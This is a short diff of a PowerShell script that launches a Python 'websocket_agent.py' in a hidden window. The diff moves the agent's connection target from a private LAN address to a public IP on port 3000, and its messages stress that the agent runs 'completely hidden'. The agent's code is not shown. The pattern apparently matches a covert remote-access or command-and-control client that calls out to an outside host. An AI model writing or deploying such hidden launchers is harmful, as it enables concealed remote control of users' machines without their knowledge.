@@ -14,7 +14,7 @@ pip install websockets
 Write-Host "Starting Python agent completely hidden..." -ForegroundColor Yellow
 
 # Use Start-Process with hidden window style and no new window
-$process = Start-Process python -ArgumentList "websocket_agent.py", "192.168.129.23", "8888", "test" -WindowStyle Hidden -PassThru
+$process = Start-Process python -ArgumentList "websocket_agent.py", "3.237.240.137", "3000", "test" -WindowStyle Hidden -PassThru
 
 Write-Host "Agent started successfully with PID: $($process.Id)" -ForegroundColor Green
 Write-Host "The Python agent is now running completely hidden." -ForegroundColor Green
